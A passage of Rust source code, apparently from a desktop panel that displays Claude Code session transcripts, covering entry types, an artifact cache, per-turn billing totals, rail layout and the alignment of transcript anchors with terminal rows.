        usage: Option<Usage>,
        /// When the answer this message is part of was written, as the local clock read
        /// it. `None` for a record that carries no timestamp, and for the reader's own
        /// messages.
        answered_at: Option<SharedString>,
    },
    Thinking {
        source: SharedString,
    },
    ToolUse {
        name: SharedString,
        input: SharedString,
        /// The `tool_use` block's own id, which is what a result names its call by.
        id: Option<SharedString>,
        /// An `Edit`'s diff of what it was asked to change. Derived here rather than
        /// while drawing, so that a card that is on screen is not diffed again on every
        /// frame; see [`edit_input_diff`].
        diff: Option<SharedString>,
    },
    ToolResult {
        label: SharedString,
        is_error: bool,
        body: ToolResultBody,
        /// The `tool_use` id this result answers. `None` on a record that never
        /// named its call; those still pair by position.
        tool_use_id: Option<SharedString>,
    },
    Image {
        image: Arc<Image>,
        media_type: SharedString,
    },
    /// The files a session handed to its reader with `SendUserFile`.
    SentFiles {
        caption: Option<SharedString>,
        files: Vec<SentFile>,
        is_error: bool,
        /// The tool result's own text, shown when the delivery failed.
        result_text: Option<SharedString>,
    },
    LocalCommand {
        text: SharedString,
    },
    /// The slash command a user record holds instead of words the user typed; see
    /// [`rewrite_slash_commands`].
    SlashCommand {
        text: SharedString,
    },
    /// A message the CLI is holding behind the turn it is running, read from the queue
    /// log. It carries no id: the queue is the session's, so there is nothing here for
    /// the panel to take back.
    Queued {
        text: SharedString,
    },
    CompactBoundary {
        trigger: SharedString,
        pre_tokens: Option<u64>,
        post_tokens: Option<u64>,
    },
    Attachments {
        items: Vec<AttachmentItem>,
    },
    /// A `system` record with a string `content`: away summaries, bridge status, hook
    /// notes, and other one-line facts that are not the conversation itself.
    SystemNote {
        subtype: SharedString,
        text: SharedString,
        url: Option<SharedString>,
    },
    /// Written when a turn closes. Placed after the turn it closes, in path order.
    TurnFooter {
        duration_ms: u64,
        message_count: u64,
        pending_background_agents: u64,
    },
    /// One line standing in for a finished turn's tool calls, thinking, and footer.
    /// The `expanded` set is keyed by the turn's user-record uuid; this entry's own key
    /// is `{uuid}#summary` so it does not collide with that message.
    TurnSummary {
        turn_id: SharedString,
        calls: usize,
        files_edited: Vec<SharedString>,
        agents: usize,
        thinking_blocks: usize,
        duration_ms: Option<u64>,
        pending_background_agents: u64,
        is_expanded: bool,
    },
    /// A record or block this panel has no display rule for. Shown as raw JSON rather
    /// than dropped, so that a transcript format that has moved on is still readable.
    Unknown {
        label: SharedString,
        raw: SharedString,
    },
}

/// One file a session delivered to its reader, as the record of the delivery names it.
///
/// The bytes are not in the transcript — only the path on the machine the session runs
/// on — which is why an image here is fetched rather than decoded out of the record the
/// way a pasted one is.
#[derive(Clone, Debug, PartialEq)]
struct SentFile {
    path: PathBuf,
    name: SharedString,
    /// The size the delivery recorded, which is the file's size when it was sent rather
    /// than now.
    size: Option<u64>,
    media_type: Option<SharedString>,
    is_image: bool,
}

impl SentFile {
    fn is_video(&self) -> bool {
        self.media_type
            .as_ref()
            .is_some_and(|media_type| media_type.starts_with("video/"))
    }
}

#[derive(Clone, Debug, PartialEq)]
enum ToolResultBody {
    Inline(SharedString),
    Persisted(PersistedOutput),
}

/// A tool output too large to be written into the transcript, which Claude Code saved to
/// its own file and replaced with a preview.
#[derive(Clone, Debug, PartialEq)]
struct PersistedOutput {
    size: SharedString,
    path: PathBuf,
    preview: SharedString,
}

#[derive(Clone, PartialEq)]
struct AttachmentItem {
    key: SharedString,
    label: SharedString,
    body: SharedString,
    /// Set when the attachment's text names a file Claude Code wrote the real output to
    /// and that file is one the panel will read back.
    persisted: Option<PersistedOutput>,
}

/// One collapsible row's header, as the row it draws rather than as an argument list:
/// six of them are built and each named the same seven things in the same order.
struct DisclosureHeader<'key> {
    entry_index: usize,
    key: &'key SharedString,
    icon: IconName,
    icon_color: Color,
    title: SharedString,
    summary: Option<SharedString>,
    is_expanded: bool,
}

/// The per-record artifacts that cost real work to derive — a decoded image, a
/// pretty-printed unrecognized record, terminal output with its escapes stripped, the
/// source string a [`Markdown`] is parsed from — kept across rebuilds of the
/// conversation.
///
/// A rebuild runs on every store notification, which is up to four times a second while
/// a reply is streaming, and deriving these again each time is what makes a long session
/// with pasted screenshots stall: a screenshot is around a megabyte and a half of base64.
/// A record never changes once absorbed, so a hit needs no validation. The two things
/// that do invalidate what was derived — the transcript being read again from the start,
/// and `absorb` replacing one record — drop keys explicitly instead.
#[derive(Default)]
struct EntryCache {
    /// Keyed by entry key: the record's uuid, plus the block's index within the record.
    kinds: HashMap<SharedString, EntryKind>,
    attachments: HashMap<SharedString, AttachmentItem>,
    /// Parsed `ToolUse` input, keyed by entry key, so a megabyte `Write` is not parsed
    /// twice on every frame.
    tool_inputs: HashMap<SharedString, Option<Value>>,
    /// Record timestamps in milliseconds, keyed by entry key, for a turn summary's
    /// duration when the turn wrote no footer.
    timestamps: HashMap<SharedString, i64>,
    /// Counts the artifacts actually derived, so that a test can show a rebuild reused
    /// them rather than only showing that it produced the same result.
    #[cfg(test)]
    derived: usize,
}

impl EntryCache {
    fn kind(
        &mut self,
        key: Option<&SharedString>,
        derive: impl FnOnce() -> EntryKind,
    ) -> EntryKind {
        if let Some(kind) = key.and_then(|key| self.kinds.get(key)) {
            return kind.clone();
        }

        #[cfg(test)]
        {
            self.derived += 1;
        }
        let kind = derive();
        if let Some(key) = key {
            self.kinds.insert(key.clone(), kind.clone());
        }
        kind
    }

    /// The same as [`Self::kind`] for a derivation that may decide the record has nothing
    /// to show. Nothing is cached for such a record: the answer is a scan of the record's
    /// own text rather than an artifact, and there is no entry to cache it under.
    fn optional_kind(
        &mut self,
        key: Option<&SharedString>,
        derive: impl FnOnce() -> Option<EntryKind>,
    ) -> Option<EntryKind> {
        if let Some(kind) = key.and_then(|key| self.kinds.get(key)) {
            return Some(kind.clone());
        }

        #[cfg(test)]
        {
            self.derived += 1;
        }
        let kind = derive()?;
        if let Some(key) = key {
            self.kinds.insert(key.clone(), kind.clone());
        }
        Some(kind)
    }

    fn get(&self, key: Option<&SharedString>) -> Option<EntryKind> {
        key.and_then(|key| self.kinds.get(key).cloned())
    }

    fn attachment(
        &mut self,
        key: Option<&SharedString>,
        derive: impl FnOnce() -> AttachmentItem,
    ) -> AttachmentItem {
        if let Some(item) = key.and_then(|key| self.attachments.get(key)) {
            return item.clone();
        }

        #[cfg(test)]
        {
            self.derived += 1;
        }
        let item = derive();
        if let Some(key) = key {
            self.attachments.insert(key.clone(), item.clone());
        }
        item
    }

    /// Drops everything derived from one record, for when `absorb` replaces it with a
    /// later record carrying the same uuid.
    fn forget_record(&mut self, uuid: &str) {
        self.kinds
            .retain(|key, _| !key_belongs_to_record(key, uuid));
        self.attachments
            .retain(|key, _| !key_belongs_to_record(key, uuid));
        self.tool_inputs
            .retain(|key, _| !key_belongs_to_record(key, uuid));
        self.timestamps
            .retain(|key, _| !key_belongs_to_record(key, uuid));
    }

    /// Forgets the records that have left the conversation being shown, so that the
    /// images of a compacted-away turn do not stay in memory for the rest of the session.
    fn retain_keys(&mut self, live_keys: &HashSet<SharedString>) {
        self.kinds.retain(|key, _| live_keys.contains(key));
        self.attachments.retain(|key, _| live_keys.contains(key));
        self.tool_inputs.retain(|key, _| live_keys.contains(key));
        self.timestamps.retain(|key, _| live_keys.contains(key));
    }

    fn parsed_tool_input(&mut self, key: &SharedString, input: &str) -> Option<&Value> {
        if !self.tool_inputs.contains_key(key) {
            self.tool_inputs
                .insert(key.clone(), parse_tool_input(input));
        }
        self.tool_inputs.get(key).and_then(Option::as_ref)
    }

    fn remember_timestamp(&mut self, key: Option<&SharedString>, record: &TranscriptRecord) {
        let Some(key) = key else {
            return;
        };
        if let Some(milliseconds) = record
            .raw
            .get(TIMESTAMP_FIELD)
            .and_then(Value::as_str)
            .and_then(crate::timestamp_ms)
        {
            self.timestamps.insert(key.clone(), milliseconds);
        }
    }
}

/// An entry key is a record's uuid on its own, or that uuid and the index of the block
/// within the record.
/// Every key that may address a cached artifact, including the attachment keys that
/// live inside the single context entry rather than being entries themselves.
fn live_cache_keys(entries: &[Entry]) -> HashSet<SharedString> {
    let mut keys = HashSet::default();
    for (index, entry) in entries.iter().enumerate() {
        keys.insert(entry.key.clone());
        // A turn's cost card is opened under a key derived from the turn's first entry,
        // and that key has to survive the rebuild that runs four times a second, or a
        // card the reader opened closes itself while the session is answering.
        if index == 0 || entry_starts_user_turn(&entry.kind) {
            keys.insert(turn_cost_key(&entry.key));
        }
        match &entry.kind {
            // An output is clamped behind an expansion key of its own, which has to
            // survive the rebuild that runs on every change to the transcript, or an
            // output the reader has opened closes itself four times a second while
            // the session is answering.
            EntryKind::ToolResult { .. } => {
                keys.insert(output_expansion_key(&entry.key));
            }
            // A CLI dispatch card reads the prompt file it was given, and both the read
            // and its answer are addressed under a key of the call's own. Without it the
            // rebuild that runs four times a second drops the `Task` and cancels the
            // read, and the card waits on a load that will never arrive.
            EntryKind::ToolUse { .. } => {
                keys.insert(dispatch_prompt_key(&entry.key));
                let report_key = dispatch_report_key(&entry.key);
                keys.insert(output_expansion_key(&report_key));
                keys.insert(report_key);
            }
            EntryKind::Attachments { items } => {
                for item in items {
                    keys.insert(item.key.clone());
                    keys.insert(output_expansion_key(&item.key));
                }
            }
            // Each sent file is fetched under a key of its own, which has to survive
            // the rebuild that runs on every change to the transcript, or an image
            // that has been fetched is fetched again four times a second while the
            // session is answering.
            EntryKind::SentFiles { files, .. } => {
                for file_index in 0..files.len() {
                    keys.insert(sent_file_key(&entry.key, file_index));
                }
            }
            EntryKind::TurnSummary { .. } => {}
            _ => {}
        }
    }
    keys
}

fn key_belongs_to_record(key: &str, uuid: &str) -> bool {
    key.strip_prefix(uuid)
        .is_some_and(|rest| rest.is_empty() || rest.starts_with('#'))
}

fn turn_summary_key(turn_id: &SharedString) -> SharedString {
    SharedString::from(format!("{turn_id}#summary"))
}

fn turn_cost_key(turn_id: &SharedString) -> SharedString {
    SharedString::from(format!("{turn_id}#cost"))
}

fn entry_starts_user_turn(kind: &EntryKind) -> bool {
    matches!(
        kind,
        EntryKind::Message {
            role: MessageRole::User,
            ..
        }
    )
}

fn is_turn_detail(kind: &EntryKind) -> bool {
    matches!(
        kind,
        EntryKind::ToolUse { .. }
            | EntryKind::ToolResult { .. }
            | EntryKind::Thinking { .. }
            | EntryKind::TurnFooter { .. }
    )
}

/// What a rail entry is worth drawing beside a terminal that already shows the
/// conversation as text.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum RailWorth {
    /// The terminal already renders this well; the rail leaves it out.
    TerminalHasIt,
    /// Drawn in the rail: the terminal cannot show it, or shows it truncated.
    Draw,
}

fn rail_worth(kind: &EntryKind) -> RailWorth {
    match kind {
        EntryKind::Image { .. }
        | EntryKind::SentFiles { .. }
        | EntryKind::Attachments { .. }
        | EntryKind::TurnSummary { .. }
        | EntryKind::TurnFooter { .. }
        | EntryKind::CompactBoundary { .. }
        | EntryKind::SystemNote { .. }
        | EntryKind::Unknown { .. } => RailWorth::Draw,
        // An Edit's diff is not text the terminal can show. Every other call is.
        EntryKind::ToolUse { diff, .. } => {
            if diff.is_some() {
                RailWorth::Draw
            } else {
                RailWorth::TerminalHasIt
            }
        }
        EntryKind::ToolResult { body, .. } => match body {
            // The terminal shows a short result in full. A persisted file, or an
            // inline body past the same line ceiling the rail already clamps, is
            // what the terminal replaces with a "ctrl+o to expand" preview.
            ToolResultBody::Persisted(_) => RailWorth::Draw,
            ToolResultBody::Inline(text) if output_is_clamped(text, MAX_UNCLAMPED_OUTPUT_LINES) => {
                RailWorth::Draw
            }
            ToolResultBody::Inline(_) => RailWorth::TerminalHasIt,
        },
        // Usage on a message is the turn's bill, drawn on the cost card, not by
        // drawing the message the terminal already has.
        EntryKind::Message { .. }
        | EntryKind::Thinking { .. }
        | EntryKind::LocalCommand { .. }
        | EntryKind::SlashCommand { .. }
        | EntryKind::Queued { .. } => RailWorth::TerminalHasIt,
    }
}

/// One decision per entry, in entry order. The same length as `entries`: a body
/// the terminal already shows is an empty element at that index, not a removed one.
#[cfg(test)]
fn rail_draw_slots(entries: &[Entry]) -> Vec<RailWorth> {
    entries
        .iter()
        .map(|entry| rail_worth(&entry.kind))
        .collect()
}

/// What one API call was billed, and what tells it apart from the next one.
///
/// Claude Code writes one record per content block, so one call arrives as two or three
/// records with different uuids and one `requestId`. Each carries a copy of the call's
/// usage. The copies match except while the answer is still streaming, when an earlier
/// record's `output_tokens` is only the tokens produced so far and the last record is
/// the call that was billed. `call_id` is that call; counting the records instead would
/// bill it two or three times.
#[derive(Clone, Debug, PartialEq, Eq)]
struct Billed {
    call_id: SharedString,
    usage: Usage,
}

/// What every record of the conversation was billed, keyed the way `build_entries` keys
/// the entries it derives from that record.
///
/// Read from the records rather than from the entries because most billed records have
/// no text block, and it is the text block alone that becomes an entry carrying usage:
/// an answer that thought and called a tool is billed without ever being a message.
fn billing_of_path(path: &[&TranscriptRecord]) -> HashMap<SharedString, Billed> {
    let mut billing = HashMap::default();
    for (path_index, record) in path.iter().enumerate() {
        let Some(usage) = Usage::from_record(&record.raw) else {
            continue;
        };
        let base_key = record_base_key(record, path_index);
        // A record written before `requestId` existed stands alone as its own call.
        // A blank id is not an id: grouping on it would merge records that do not
        // name a call. Those stand alone too.
        let call_id = record
            .raw
            .get(REQUEST_ID_FIELD)
            .and_then(Value::as_str)
            .filter(|request_id| !request_id.is_empty())
            .map(|request_id| SharedString::from(request_id.to_string()))
            .unwrap_or_else(|| base_key.clone());
        billing.insert(base_key, Billed { call_id, usage });
    }
    billing
}

/// The record an entry came from: the entry key without the block index appended to it.
fn record_id_of(key: &SharedString) -> SharedString {
    match key.split_once('#') {
        Some((record_id, _)) => SharedString::from(record_id),
        None => key.clone(),
    }
}

/// What an entry's own record was billed, if anything: the bill read from the record,
/// or, for entries built without one, the usage the message itself carries.
fn billed_entry(entry: &Entry, billing: &HashMap<SharedString, Billed>) -> Option<Billed> {
    let record_id = record_id_of(&entry.key);
    if let Some(billed) = billing.get(&record_id) {
        return Some(billed.clone());
    }
    let EntryKind::Message {
        usage: Some(usage), ..
    } = &entry.kind
    else {
        return None;
    };
    Some(Billed {
        call_id: record_id,
        usage: *usage,
    })
}

/// Every billed API call of one turn, oldest first, and their total.
fn turn_billing(
    entries: &[Entry],
    turn_start: usize,
    billing: &HashMap<SharedString, Billed>,
) -> (Vec<Usage>, Usage) {
    let mut calls = Vec::new();
    let Some(turn) = entries.get(turn_start..) else {
        return (calls, Usage::default());
    };

    // The call stays where it started. A later record of the same call is a fuller
    // snapshot, not a second call, and must not jump past a call that began after it.
    let mut call_index: HashMap<SharedString, usize> = HashMap::default();
    for (offset, entry) in turn.iter().enumerate() {
        if offset > 0 && entry_starts_user_turn(&entry.kind) {
            break;
        }
        let Some(billed) = billed_entry(entry, billing) else {
            continue;
        };
        if let Some(&index) = call_index.get(&billed.call_id) {
            if let Some(call) = calls.get_mut(index) {
                *call = billed.usage;
            }
        } else {
            call_index.insert(billed.call_id, calls.len());
            calls.push(billed.usage);
        }
    }
    let mut total = Usage::default();
    for usage in &calls {
        total = total.add(*usage);
    }
    (calls, total)
}

/// `[start, end)` of the turn that contains `index`. A turn runs from a user
/// message up to, but not including, the next one. Entries before the first
/// user message are their own span.
fn turn_bounds(entries: &[Entry], index: usize) -> Option<(usize, usize)> {
    if index >= entries.len() {
        return None;
    }
    let start = entries[..=index]
        .iter()
        .rposition(|entry| entry_starts_user_turn(&entry.kind))
        .unwrap_or(0);
    let end = entries
        .iter()
        .enumerate()
        .skip(start.saturating_add(1))
        .find(|(_, entry)| entry_starts_user_turn(&entry.kind))
        .map(|(end, _)| end)
        .unwrap_or(entries.len());
    Some((start, end))
}

/// The entry a turn's cost card is drawn under: its summary, or, when the turn
/// was not collapsed, the last entry whose record was billed.
///
/// Tests that build entries by hand have no bill taken before collapse, so they
/// ask the entries themselves. The panel uses the bill taken before collapse.
#[cfg(test)]
fn turn_cost_anchor(
    entries: &[Entry],
    index: usize,
    billing: &HashMap<SharedString, Billed>,
) -> bool {
    let Some((start, _)) = turn_bounds(entries, index) else {
        return false;
    };
    let has_calls = !turn_billing(entries, start, billing).0.is_empty();
    cost_anchor_at(entries, index, has_calls, billing)
}

/// Where the card hangs, once the caller already knows the turn was billed.
///
/// `has_calls` is not recomputed here. Collapse drops the thinking and tool entries
/// a call was read from, so a caller that still has the pre-collapse bill must say
/// so itself; recomputing from the entries on screen would hide that turn.
fn cost_anchor_at(
    entries: &[Entry],
    index: usize,
    has_calls: bool,
    billing: &HashMap<SharedString, Billed>,
) -> bool {
    if !has_calls {
        return false;
    }
    let Some((start, end)) = turn_bounds(entries, index) else {
        return false;
    };
    let Some(turn) = entries.get(start..end) else {
        return false;
    };
    if let Some(offset) = turn
        .iter()
        .position(|entry| matches!(entry.kind, EntryKind::TurnSummary { .. }))
    {
        return start.saturating_add(offset) == index;
    }
    // Not "the last billed message": a turn can be several calls deep without having
    // written a text block, and the running turn is never collapsed into a summary.
    turn.iter()
        .enumerate()
        .rev()
        .find(|(_, entry)| billed_entry(entry, billing).is_some())
        .is_some_and(|(offset, _)| start.saturating_add(offset) == index)
}

/// Each turn's calls, keyed by the entry collapse leaves in place (the turn's first).
///
/// Computed from the entries before collapse. A finished turn then drops the thinking
/// and tool entries, and the last record of a call is often one of those.
fn turn_bills(
    entries: &[Entry],
    billing: &HashMap<SharedString, Billed>,
) -> HashMap<SharedString, (Vec<Usage>, Usage)> {
    let mut bills = HashMap::default();
    for (index, entry) in entries.iter().enumerate() {
        if index != 0 && !entry_starts_user_turn(&entry.kind) {
            continue;
        }
        let bill = turn_billing(entries, index, billing);
        if bill.0.is_empty() {
            continue;
        }
        bills.insert(entry.key.clone(), bill);
    }
    bills
}

/// The calls drawn for the turn that contains `index`, from a bill taken before collapse.
fn displayed_turn_usage(
    entries: &[Entry],
    index: usize,
    bills: &HashMap<SharedString, (Vec<Usage>, Usage)>,
) -> Option<(Vec<Usage>, Usage)> {
    let (start, _) = turn_bounds(entries, index)?;
    let turn_id = &entries.get(start)?.key;
    bills.get(turn_id).cloned()
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum WorkArea {
    TerminalOnly,
    TerminalAndRail,
    RailOnly,
}

fn work_area(rail_expanded: bool, reading_an_agent: bool) -> WorkArea {
    // Collapsing the rail gives the terminal the width. A subagent has no
    // terminal, so a collapsed rail would be an empty pane.
    if reading_an_agent {
        WorkArea::RailOnly
    } else if rail_expanded {
        WorkArea::TerminalAndRail
    } else {
        WorkArea::TerminalOnly
    }
}

/// The gutter sits between the terminal and the rail. A subagent has no terminal
/// (`RailOnly`), and a session that has not attached has nothing to align to.
fn anchor_gutter_shown(area: WorkArea, has_terminal: bool) -> bool {
    has_terminal && !matches!(area, WorkArea::RailOnly)
}

fn anchor_chip_top(row: usize, line_height: Pixels) -> Pixels {
    line_height * (row as f32)
}

/// `available` is the width shared by the terminal and the rail, after the gutter and
/// the resize handle. When that cannot satisfy both floors, the rail gives way: a
/// terminal under 320px makes tmux reflow the whole TUI.
fn clamped_rail_width(requested: Pixels, available: Pixels) -> Pixels {
    let minimum = px(RAIL_WIDTH_MIN_PIXELS);
    let maximum = px(RAIL_WIDTH_MAX_PIXELS);
    let terminal_limit = available - px(TERMINAL_MIN_WIDTH_PIXELS);
    if terminal_limit < minimum {
        return terminal_limit.clamp(px(0.), maximum);
    }
    requested.clamp(minimum, terminal_limit.min(maximum))
}

/// Budget passed to [`clamped_rail_width`] before the row has been measured. Large
/// enough that the terminal floor does not bind, so the 240..=900 clamp is the only
/// one applied.
fn unconstrained_rail_budget() -> Pixels {
    px(RAIL_WIDTH_MAX_PIXELS + TERMINAL_MIN_WIDTH_PIXELS)
}

fn terminal_and_rail_budget(row_width: Pixels, gutter_shown: bool) -> Pixels {
    let chrome = px(RAIL_RESIZE_HANDLE_PIXELS)
        + if gutter_shown {
            px(ANCHOR_GUTTER_WIDTH_PIXELS)
        } else {
            px(0.)
        };
    row_width - chrome
}

fn anchored_on_screen_keys(anchorings: &[Anchoring]) -> HashSet<SharedString> {
    anchorings
        .iter()
        .map(|anchoring| SharedString::from(anchoring.key.as_str()))
        .collect()
}

fn rail_follow_index(
    anchorings: &[Anchoring],
    reachable_anchors: &[ReachableAnchor],
    scrolled_back: bool,
    entries_len: usize,
) -> Option<usize> {
    if !scrolled_back {
        return None;
    }
    // Several anchors can share the top row. A later one on that row is still the top
    // of the screen; skipping it because an earlier key does not resolve would drop a
    // legal index. A lower row is a different place and is not a substitute.
    let top_row = anchorings.iter().map(|anchoring| anchoring.row).min()?;
    anchorings
        .iter()
        .filter(|anchoring| anchoring.row == top_row)
        .find_map(|top| {
            reachable_anchors.iter().find_map(|anchor| {
                (anchor.anchor.key == top.key && anchor.index < entries_len).then_some(anchor.index)
            })
        })
}

/// `None` means do not scroll. The same index as last time is `None` on purpose:
/// calling scroll every frame would pin the rail.
fn rail_follow_scroll(
    previous: Option<usize>,
    next: Option<usize>,
    scrolled_back: bool,
) -> Option<usize> {
    if !scrolled_back {
        return None;
    }
    match next {
        Some(index) if previous != Some(index) => Some(index),
        _ => None,
    }
}

fn hover_anchor_changed(current: Option<&str>, next: Option<&str>) -> bool {
    current != next
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum AnchorChip {
    EditDiff,
    Image,
    ExpandOutput,
    Other,
}

fn anchor_chip(kind: &EntryKind) -> AnchorChip {
    match kind {
        EntryKind::ToolUse { name, diff, .. }
            if name.as_ref() == EDIT_TOOL_NAME && diff.is_some() =>
        {
            AnchorChip::EditDiff
        }
        EntryKind::Image { .. } => AnchorChip::Image,
        EntryKind::ToolResult { body, .. } if tool_result_needs_expand(body) => {
            AnchorChip::ExpandOutput
        }
        _ => AnchorChip::Other,
    }
}

fn tool_result_needs_expand(body: &ToolResultBody) -> bool {
    match body {
        // The terminal replaces a persisted output with a short preview.
        ToolResultBody::Persisted(_) => true,
        ToolResultBody::Inline(text) => output_is_clamped(text, MAX_UNCLAMPED_OUTPUT_LINES),
    }
}

fn anchor_chip_icon(chip: AnchorChip) -> IconName {
    match chip {
        AnchorChip::EditDiff => IconName::FileDiff,
        AnchorChip::Image => IconName::Image,
        AnchorChip::ExpandOutput => IconName::ExpandVertical,
        AnchorChip::Other => IconName::ChevronRight,
    }
}

/// What a call produced. A result that names its `tool_use` id is paired by that id,
/// wherever it sits; a result with no id still follows the call, which is all an old
/// record can say. Images have no id of their own, so they stay with the result they
/// were written beside.
// The rail builds the id index once and goes through `call_results_with_starts`.
// This stays so a test can ask about one call on its own.
#[cfg(test)]
fn call_results(entries: &[Entry], call_index: usize) -> &[Entry] {
    call_results_with_starts(entries, call_index, &first_result_of_each_call(entries))
}

/// Where each `tool_use` id is first answered. Built once per pass over the entries,
/// because searching the whole conversation for every call is quadratic in its length
/// and the pass runs on the foreground thread on every rebuild.
fn first_result_of_each_call(entries: &[Entry]) -> HashMap<&str, usize> {
    let mut starts: HashMap<&str, usize> = HashMap::default();
    for (index, entry) in entries.iter().enumerate() {
        if let EntryKind::ToolResult {
            tool_use_id: Some(id),
            ..
        } = &entry.kind
        {
            starts.entry(id.as_ref()).or_insert(index);
        }
    }
    starts
}

fn call_results_with_starts<'a>(
    entries: &'a [Entry],
    call_index: usize,
    starts: &HashMap<&str, usize>,
) -> &'a [Entry] {
    if let Some(id) = entries.get(call_index).and_then(|entry| match &entry.kind {
        EntryKind::ToolUse { id, .. } => id.as_ref(),
        _ => None,
    }) && let Some(start) = starts.get(id.as_ref()).copied()
    {
        return identified_call_results(entries, id, start);
    }
    positional_call_results(entries, call_index)
}

fn identified_call_results<'a>(
    entries: &'a [Entry],
    id: &SharedString,
    start: usize,
) -> &'a [Entry] {
    let mut end = start.saturating_add(1);
    while end < entries.len() {
        match &entries[end].kind {
            EntryKind::Image { .. } => end = end.saturating_add(1),
            EntryKind::ToolResult { tool_use_id, .. } if tool_use_id.as_ref() == Some(id) => {
                end = end.saturating_add(1);
            }
            _ => break,
        }
    }
    // A result whose content puts the image before the text writes the image entry
    // first, so the run reaches back over it. It stops before an earlier result,
    // whose own trailing images those would be.
    let mut first = start;
    while first > 0 && matches!(entries[first - 1].kind, EntryKind::Image { .. }) {
        first -= 1;
    }
    let start = match first.checked_sub(1).and_then(|before| entries.get(before)) {
        Some(entry) if matches!(entry.kind, EntryKind::ToolResult { .. }) => start,
        _ => first,
    };
    entries.get(start..end).unwrap_or(&[])
}

/// Results that never named a call. A result that does name one is left for
/// [`identified_call_results`]; taking it here would hand it to the wrong call.
fn positional_call_results(entries: &[Entry], call_index: usize) -> &[Entry] {
    let Some(start) = call_index.checked_add(1) else {
        return &[];
    };
    let Some(rest) = entries.get(start..) else {
        return &[];
    };
    let length = rest
        .iter()
        .take_while(|entry| {
            matches!(
                &entry.kind,
                EntryKind::ToolResult {
                    tool_use_id: None,
                    ..
                } | EntryKind::Image { .. }
            )
        })
        .count();
    &rest[..length]
}

/// Which chip the anchored row draws, or `None` for no chip. An `Image` and a
/// `ToolResult` have no anchor row of their own — a result's first column is `⎿`, and an
/// image sits inside one — so the call's own row says what that call produced.
fn anchored_chip(kind: &EntryKind, results: &[Entry]) -> Option<AnchorChip> {
    if !matches!(kind, EntryKind::ToolUse { .. }) {
        return Some(anchor_chip(kind));
    }
    if matches!(anchor_chip(kind), AnchorChip::EditDiff) {
        return Some(AnchorChip::EditDiff);
    }
    let mut expands = false;
    for result in results {
        match anchor_chip(&result.kind) {
            AnchorChip::Image => return Some(AnchorChip::Image),
            AnchorChip::ExpandOutput => expands = true,
            AnchorChip::EditDiff | AnchorChip::Other => {}
        }
    }
    expands.then_some(AnchorChip::ExpandOutput)
}

/// Grid lines are counted from the top of the screen, so scrolling back by
/// `display_offset` rows puts the visible rows at negative lines; see
/// `terminal_view::viewport_line_for_point`, which is the same conversion.
fn visible_grid_line(line: i32, display_offset: usize) -> i32 {
    line.saturating_add(i32::try_from(display_offset).unwrap_or(i32::MAX))
}

/// The transcript anchors a cache miss can keep. Parsing every call's input again is the
/// expensive half of a rebuild, and only a change to the entries can change the result.
fn reusable_anchors(
    cache: Option<AnchorCache>,
    entries_generation: u64,
) -> Option<Vec<terminal_anchors::TranscriptAnchor>> {
    cache
        .filter(|cache| cache.entries_generation == entries_generation)
        .map(|cache| cache.transcript)
}

struct AnchorCache {
    entries_generation: u64,
    glyphs: Glyphs,
    columns: usize,
    screen_lines: usize,
    line_height: Pixels,
    cell_width: Pixels,
    rows: Vec<ScreenRow>,
    transcript: Vec<terminal_anchors::TranscriptAnchor>,
    anchorings: Vec<Anchoring>,
}

/// An anchor plus the collapsed-list index a click can scroll to, and the chip
/// computed from the pre-collapse entries (collapse drops the result the chip reads).
struct ReachableAnchor {
    anchor: terminal_anchors::TranscriptAnchor,
    index: usize,
    chip: Option<AnchorChip>,
}

fn same_anchor_identity(left: &[ReachableAnchor], right: &[ReachableAnchor]) -> bool {
    left.len() == right.len()
        && left
            .iter()
            .zip(right)
            .all(|(left, right)| left.anchor == right.anchor)
}

/// Maps each anchor in `before` onto an index in `after`. An entry collapse kept
/// stays itself; one collapse dropped points at that turn's summary. The chip is
/// read from `before`, because `after` no longer holds the result.
fn reachable_anchors(before: &[Entry], after: &[Entry]) -> Vec<ReachableAnchor> {
    let mut index_of: HashMap<&str, usize> = HashMap::default();
    for (index, entry) in after.iter().enumerate() {
        index_of.insert(entry.key.as_ref(), index);
    }

    let result_starts = first_result_of_each_call(before);
    let mut turn_id: Option<&SharedString> = None;
    let mut anchors = Vec::new();
    for (pre_index, entry) in before.iter().enumerate() {
        if entry_starts_user_turn(&entry.kind) {
            turn_id = Some(&entry.key);
        }
        let Some(anchor) = transcript_anchor(entry) else {
            continue;
        };
        let index = if let Some(index) = index_of.get(entry.key.as_ref()).copied() {
            index
        } else if let Some(turn_id) = turn_id {
            let summary_key = turn_summary_key(turn_id);
            let Some(index) = index_of.get(summary_key.as_ref()).copied() else {
                continue;
            };
            index
        } else {
            continue;
        };
        let chip = anchored_chip(
            &entry.kind,
            call_results_with_starts(before, pre_index, &result_starts),
        );
        anchors.push(ReachableAnchor {
            anchor,
            index,
            chip,
        });
    }
    anchors
}

fn transcript_anchor(entry: &Entry) -> Option<terminal_anchors::TranscriptAnchor> {
    match &entry.kind {
        EntryKind::Message { role, source, .. } => Some(terminal_anchors::TranscriptAnchor {
            key: entry.key.to_string(),
            glyph: if matches!(role, MessageRole::User) {
                terminal_anchors::AnchorGlyph::UserPrompt
            } else {
                terminal_anchors::AnchorGlyph::Assistant
            },
            text: message_anchor_text(source),
        }),
        EntryKind::ToolUse { name, input, .. } => Some(terminal_anchors::TranscriptAnchor {
            key: entry.key.to_string(),
            glyph: terminal_anchors::AnchorGlyph::Assistant,
            text: tool_anchor_text(name, input),
        }),
        _ => None,
    }
}

// The rail reads `reachable_anchors`. This stays so the anchor-text test can
// still ask for the pre-collapse list on its own.
#[cfg(test)]
fn transcript_anchors(entries: &[Entry]) -> Vec<terminal_anchors::TranscriptAnchor> {
    entries.iter().filter_map(transcript_anchor).collect()
}

/// Which transcript slice `align` should see.
///
/// At the bottom of the screen the tail window is the one the spec asks for.
/// Scrolled back, that tail is the newest tool calls, and a visible older row
/// either matches nothing or matches a newer copy of the same text. A window
/// that covers more of the visible rows wins; a tie keeps the newer start.
/// A visible span longer than one window cannot be covered in full, so that
/// tie-break drops the oldest rows of the span.
fn transcript_window_for_screen<'a>(
    screen: &[terminal_anchors::AnchorRow],
    transcript: &'a [terminal_anchors::TranscriptAnchor],
    scrolled_back: bool,
) -> &'a [terminal_anchors::TranscriptAnchor] {
    let window = terminal_anchors::MAX_TRANSCRIPT_ANCHORS;
    if !scrolled_back || screen.is_empty() || transcript.len() <= window {
        return transcript;
    }

    // This runs on every frame the terminal spends scrolled back, and `rows_match`
